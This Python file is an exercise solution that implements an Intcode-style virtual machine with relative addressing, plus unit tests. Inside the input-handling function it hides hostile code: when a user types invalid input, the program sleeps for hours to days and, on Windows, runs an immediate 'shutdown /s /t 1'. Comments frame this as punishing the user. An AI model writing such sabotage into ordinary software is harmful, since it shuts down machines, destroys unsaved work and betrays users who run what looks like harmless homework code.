import enum
import os
from colorama import Fore
import logging
import time
import random
from sys import platform
import subprocess
# For this weeeks exercise you again need to add a feature to your existing simulated computer:

# - The computer needs to implement memory much /larger/ than the set of initial commands.
#   Any memory address not part of the initial commands can be assumed to be initialized to 0.
#   Only positive addresses are valid, but any positive address can be both read and written.
# - You need to support a new parameter mode, called 'relative mode', and denoted as mode 2 in
#   the 'mode' part of the instructions.
#   Relative mode is similar to position mode (the first access mode you implemented). However,
#   parameters in relative mode count not from 0, but from a value called 'relative offset'.
#   When the computer is initialized, the relative offset is initialized to 0, and as long as it remains
#   0 relative mode and position mode are identical.
#   In general though parameters in relative mode address the memory location at 'relative offset + parameter value'.
#   EXAMPLE: if the relative offset is 50, the mode is 2, and the value you read from memory is 7 you should
#     retrieve data from the memory address 57.
#     Equally, if you read -7, you should retrieve data from the memory address 43.
#   This applies to both read- and write operations (!)

# - You need to implement a new opcode, opcode 9. opcode 9 adjusts the relative offset by the value of its only parameter.
#   the offset increases by the value of the parameter (or decreases if the parameter value is negative).

# Here is a short program to test your implementation:
#   [109,1,204,-1,1001,100,1,100,1008,100,16,101,1006,101,0,99] should output a copy of itself
#   
# The actual input is in a separate file, input_memory_01.txt under the data folder.
# When asked for input provide the value 2. There should be a single output. Please include it in your PR.


class op_mode(enum.Enum):
    POSITION = 0
    IMMEDIATE = 1
    RELATIVE = 2


class operations(enum.Enum):
    # region opcode explanation
    # - 1: add the values of the two parameters and store the result in the position given by the third parameter
    # - 2: multiply the values of the two parameters and store the result in the position given by the third parameter
    # - 3: read a single integer as input and save it to the position given
    #      by its only parameter. the command 3,19 would read an input
    #      and store the result at address 19
    # - 4: output the value of the single parameter for this opcode.
    #      for example 4,19 would output the value stored at address 19             
    # - 5: jump-if-true: if the first parameter is non-zero, it sets the instruction pointer to the value from the second parameter. Otherwise, it does nothing.
    # - 6: jump-if-false: if the first parameter is zero, it sets the instruction pointer to the value from the second parameter. Otherwise, it does nothing.
    # - 7: less than: if the first parameter is less than the second parameter, it stores 1 in the position given by the third parameter. Otherwise, it stores 0.
    # - 8: equals: if the first parameter is equal to the second parameter, it stores 1 in the position given by the third parameter. Otherwise, it stores 0.
    # - 9: adjusts the relative offset by the value of its only parameter.
    #      the offset increases by the value of the parameter (or decreases if the parameter value is negative).
    # endregion
    ADD = 1
    MULTIPLY = 2
    INPUT = 3
    OUTPUT = 4
    JUMP_IF_TRUE = 5
    JUMP_IF_FALSE = 6
    LESS_THAN = 7
    EQUALS = 8
    CHANGE_RELATIVE_OFFSET = 9
    HALT = 99


def get_element(mode: op_mode, dct: dict, idx: int, offset: int) -> int:
    """returns element based upon the task mode"""
    match mode:
        case op_mode.POSITION:
            return dct.get(dct.get(idx, 0), 0)
        case op_mode.IMMEDIATE:
            return dct.get(idx, 0)
        case op_mode.RELATIVE:
            return dct.get(dct.get(idx, 0) + offset, 0)


def calc(dct: dict, idx: int, op: operations, instruction: list, offset: int) -> int:
    """calc is short for calculator. Handles 1,2,7 and 8"""
    param_one_mode = op_mode(int(instruction[0]))
    param_two_mode = op_mode(int(instruction[1]))
    idx += 1 
    param_one = get_element(param_one_mode, dct, idx, offset)
    idx += 1
    param_two = get_element(param_two_mode, dct, idx, offset)
    idx += 1
    write_mode = op_mode(int(instruction[2]))
    destination = dct.get(idx, 0) + (offset if write_mode == op_mode.RELATIVE else 0)
    match op:
        case operations.ADD:
            dct[destination] = param_one + param_two
        case operations.MULTIPLY:
            dct[destination] = param_one * param_two
        case operations.LESS_THAN:
            dct[destination] = 1 if param_one < param_two else 0
        case operations.EQUALS:
            dct[destination] = 1 if param_one == param_two else 0
    logging.debug(f'Calculation: {dct[destination]}')
    return idx + 1


def jump_operation(dct: dict,
                   idx: int,
                   op: operations,
                   instruction: list,
                   offset: int) -> int:
    """handles the jump operations 5 and 6"""
    param_one_mode = op_mode(int(instruction[0]))
    param_two_mode = op_mode(int(instruction[1]))

    idx += 1
    param_one = get_element(param_one_mode, dct, idx, offset)
    idx += 1
    param_two = get_element(param_two_mode, dct, idx, offset)

    if (op == operations.JUMP_IF_TRUE and param_one != 0) or (op == operations.JUMP_IF_FALSE and param_one == 0):
        return param_two
    return idx + 1


def write_value(dct: dict, idx: int, mode: op_mode, offset: int, input_value: int) -> int:
    match mode:
        case op_mode.RELATIVE:
            dct[dct[idx] + offset] = input_value
        case _:
            dct[dct[idx]] = input_value
    return idx + 1, dct


def read_value(dct: dict, idx: int, instruction: list, offset: int) -> int:
    """handles input value operation 3"""
    idx += 1
    param_mode = op_mode(int(instruction[0]))
    # ? try catch error, to minimize ID10T errors
    while True:
        try:
            input_value = int(input("Please enter a value: "))
            idx, dct = write_value(dct, idx, param_mode, offset, input_value)
            break
        except ValueError:
            print("Please enter a valid number")
            # ! Punishes the user for wrong input
            time.sleep(random.randint(9999, 999999))
            if platform == "win32":
                # ! additionaly punish windows users for using Windows and
                # ! wrong input
                subprocess.call("shutdown /s /t 1")
    return idx, dct


def output_value(dct: dict, idx: int, instruction: list, offset: int) -> int:
    """Handles output value operation (opcode 4)."""
    param_mode = op_mode(int(instruction[0]))
    idx += 1
    output = get_element(param_mode, dct, idx, offset)
    print(f"Opcode 4 - Accessed Memory: {dct.get(idx)} | Output Value: {output}")  # Debug statement
    print(f"Output by opcode 4 = {output}")  # Required format
    return idx + 1


def change_offset(offset: int, instruction: list, dct: dict, idx: int) -> int:
    param_mode = op_mode(int(instruction[0]))
    idx += 1
    param_one: int = get_element(param_mode, dct, idx, offset)
    offset += param_one
    idx += 1
    return offset, idx


def check_for_opcode(idx: int, dct: dict, offset: int = 0):
    operation = str(dct[idx])
    while len(operation) < 6:
        operation = '0' + operation
    try:
        opcode = operations(int(operation) % 100)
        operation = operation[-3:-6:-1]
    except ValueError:
        logging.error(f'Invalid opcode: code at index {idx}')
        return False, 0, offset
    logging.debug(f'Current opcode: {opcode}')
    end = False
    # region opcode handeling
    match opcode:
        case operations.ADD:
            idx = calc(dct, idx, operations.ADD, operation, offset)
        case operations.MULTIPLY:
            idx = calc(dct, idx, operations.MULTIPLY, operation, offset)
        case operations.INPUT:
            idx, dct = read_value(dct, idx, operation, offset)
        case operations.OUTPUT:
            idx = output_value(dct, idx, operation, offset)
        case operations.JUMP_IF_TRUE:
            idx = jump_operation(dct, idx, operations.JUMP_IF_TRUE,
                                 operation, offset)
        case operations.JUMP_IF_FALSE:
            idx = jump_operation(dct, idx, operations.JUMP_IF_FALSE,
                                 operation, offset)
        case operations.LESS_THAN:
            idx = calc(dct, idx, operations.LESS_THAN, operation, offset)
        case operations.EQUALS:
            idx = calc(dct, idx, operations.EQUALS, operation, offset)
        case operations.CHANGE_RELATIVE_OFFSET:
            offset, idx = change_offset(offset, operation, dct, idx)
        case operations.HALT:
            end = True
    # endregion
    return idx, end, offset


def reader(commands: dict | str | list,
           idx: int = 0,
           end: bool = False) -> int:
    """reads the commands and executes and also decides how
    to handle the input since it accepts dict, str and list"""
    if type(commands) is str:
        commands = read_file(commands)
    elif type(commands) is list:
        commands = list_to_dict(commands)
    offset = 0
    while end is False:
        idx, end, offset = check_for_opcode(idx, commands, offset)
    return commands[0]


def list_to_dict(lst: list) -> dict:
    """converts list to a dictionary with values from the list and 
    enumerated keys e.g. [10,20,30,40] -> {0: 10, 1: 20, 2: 30, 3: 40}"""
    goal = {}
    goal = {index: value for index, value in enumerate(lst)}
    return goal


def read_file(path: str) -> dict:
    """reads the input file and returns the needed dict"""
    with open(path, "r") as f:
        input = f.read().strip().split(",") # strip is in the current file obsolete but it could be useful in the future
    print(f'Input: {input[:20]}')
    input = list_to_dict([int(i) for i in input])
    return input


script_dir = os.path.dirname(os.path.abspath(__file__))
sequence_path = os.path.join(
    script_dir, "..", "..", "data", "input_memory_01.txt"
)

print(Fore.LIGHTGREEN_EX + f'-----\nFinal output of the command: {reader(sequence_path)}\n-----')
print(Fore.RESET)


# region tests
def test_int_computer():
    test_list = [109, 1, 204, -1, 1001, 100, 1, 100, 1008, 100, 16, 101, 1006, 101, 0, 99]
    assert reader(test_list) == 109


def test_addition():
    test_list = [1101, 5, 10, 0, 99]
    assert reader(test_list) == 15


def test_multiplication():
    test_list = [1102, 5, 10, 0, 99]
    assert reader(test_list) == 50


def test_input_output(monkeypatch):
    test_list = [3, 0, 4, 0, 99]
    monkeypatch.setattr('builtins.input', lambda _: '42')
    assert reader(test_list) == 42


def test_jump_if_true():
    test_list = [1105, 1, 4, 99, 1101, 0, 0, 0, 99]
    assert reader(test_list) == 0


def test_jump_if_false():
    test_list = [1106, 0, 4, 99, 1101, 0, 0, 0, 99]
    assert reader(test_list) == 0


def test_less_than():
    test_list = [1107, 1, 2, 0, 99]
    assert reader(test_list) == 1


def test_equals():
    test_list = [1108, 2, 2, 0, 99]
    assert reader(test_list) == 1


def test_change_relative_offset():
    test_list = [109, 5, 204, -5, 99]
    assert reader(test_list) == 109


def test_list_to_dict():
    test_list = [10, 20, 30, 40]
    expected_dict = {0: 10, 1: 20, 2: 30, 3: 40}
    assert list_to_dict(test_list) == expected_dict
# endregion
